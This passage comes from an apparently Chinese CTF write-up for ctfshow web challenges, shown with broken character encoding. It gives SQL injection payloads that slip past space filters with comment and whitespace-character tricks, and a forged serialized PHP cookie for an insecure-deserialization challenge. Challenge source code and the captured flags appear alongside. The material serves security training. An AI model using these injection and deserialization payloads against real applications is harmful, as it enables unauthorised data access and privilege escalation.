   //ä»£ç è¿‡äºç®€å•ï¼Œä¸å®œå±•ç¤º
  &#125;
      
</code></pre><pre><code>è¿‡æ»¤äº†ç©ºæ ¼
payloadï¼š1'/**/union/**/select/**/1,2,password/**/from/**/ctfshow_user/**/where/**/username/**/='flag'%23
</code></pre><pre><code>ctfshow&#123;0cfae509-b430-4d65-a829-5df539518b92&#125;
</code></pre><h2 id="web178"><a class="anchor" href="#web178">#</a> web178</h2><p>æŸ¥è¯¢è¯­å¥</p><pre><code>//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·
$sql = &quot;select id,username,password from ctfshow_user where username !='flag' and id = '&quot;.$_GET['id'].&quot;' limit 1;&quot;;
      
</code></pre><p>è¿”å›é€»è¾‘</p><pre><code>//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤
  function waf($str)&#123;
   //ä»£ç è¿‡äºç®€å•ï¼Œä¸å®œå±•ç¤º
  &#125;
      
</code></pre><pre><code>è¿‡æ»¤äº†ç©ºæ ¼ã€*ç­‰ï¼Œç”¨%09ç»•è¿‡

payload1:
1'%09union%09select%091,2,password%09from%09ctfshow_user%09where%09username%09='flag'%23

payload2:
1'%0bunion%0bselect%0b1,2,password%0bfrom%0bctfshow_user%0bwhere%0busername%0b='flag'%23

payload3:
1'or'1'='1'%23
</code></pre><pre><code>ctfshow&#123;bada9a8a-ef29-4f86-9d33-7e4f35d708c7&#125;
</code></pre><h2 id="web179"><a class="anchor" href="#web179">#</a> web179</h2><p>æŸ¥è¯¢è¯­å¥</p><pre><code>//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·
$sql = &quot;select id,username,password from ctfshow_user where username !='flag' and id = '&quot;.$_GET['id'].&quot;' limit 1;&quot;;
      
</code></pre><p>è¿”å›é€»è¾‘</p><pre><code>//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤
  function waf($str)&#123;
   //ä»£ç è¿‡äºç®€å•ï¼Œä¸å®œå±•ç¤º
  &#125;
      
</code></pre><pre><code>æ–°è¿‡æ»¤äº†%09

payloadï¼š
99'%0cunion%0cselect%0c1,2,password%0cfrom%0cctfshow_user%0cwhere%0cusername%0c='flag'%23
</code></pre><pre><code>ctfshow&#123;f7254fe5-7159-42ab-b5f3-cdbb5c7de8c3&#125;
</code></pre><h1 id="ååºåˆ—åŒ–"><a class="anchor" href="#ååºåˆ—åŒ–">#</a> ååºåˆ—åŒ–</h1><h2 id="web254"><a class="anchor" href="#web254">#</a> web254</h2><p>å¼€å§‹ååºåˆ—åŒ–</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-12-02 17:44:47</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-12-02 19:29:02</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"your flag is "</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip, no flag"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="41"></td><td><pre></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="43"></td><td><pre><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="44"></td><td><pre></pre></td></tr><tr><td data-num="45"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="46"></td><td><pre>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>            <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="50"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="51"></td><td><pre>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="52"></td><td><pre>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip,no flag"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="53"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="54"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>payloadï¼š</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">?</span>username<span class="token operator">=</span>xxxxxx<span class="token operator">&amp;</span>password<span class="token operator">=</span>xxxxxx</pre></td></tr></table></figure><pre><code>ctfshow&#123;c7ae2016-c828-4005-b0c7-de10418de1eb&#125;
</code></pre><h2 id="web255"><a class="anchor" href="#web255">#</a> web255</h2><p>å¼€å§‹ååºåˆ—åŒ–</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-12-02 17:44:47</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-12-02 19:29:02</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"your flag is "</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip, no flag"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="38"></td><td><pre></pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </pre></td></tr><tr><td data-num="44"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="46"></td><td><pre>            <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip,no flag"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="50"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="51"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>å®¡è®¡ä»£ç </pre></td></tr><tr><td data-num="2"></td><td><pre>$user = unserialize($_COOKIE['user']); </pre></td></tr><tr><td data-num="3"></td><td><pre>å°†ååºåˆ—åŒ–çš„ç»“æœèµ‹å€¼ç»™userå¹¶ä¼ å…¥cookie</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>//åœ¨æœ¬åœ°è¾“å‡ºåºåˆ—åŒ–ç»“æœï¼Œå°†vipæ”¹ä¸ºtrue</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> </span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>    </pre></td></tr><tr><td data-num="20"></td><td><pre>payload:</pre></td></tr><tr><td data-num="21"></td><td><pre>GETè¾“å‡º?username=xxxxxx&amp;password=xxxxxx</pre></td></tr><tr><td data-num="22"></td><td><pre>Cookie:user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</pre></td></tr></table></figure><pre><code>ctfshow&#123;41cb227c-9295-4cb1-ba53-a9c5a838820e&#125;
</code></pre><h2 id="web256"><a class="anchor" href="#web256">#</a> web256</h2><p>å¼€å§‹ååºåˆ—åŒ–</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-12-02 17:44:47</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-12-02 19:29:02</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">!==</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"your flag is "</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>              <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip, no flag"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="40"></td><td><pre></pre></td></tr><tr><td data-num="41"></td><td><pre><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="43"></td><td><pre></pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </pre></td></tr><tr><td data-num="46"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token 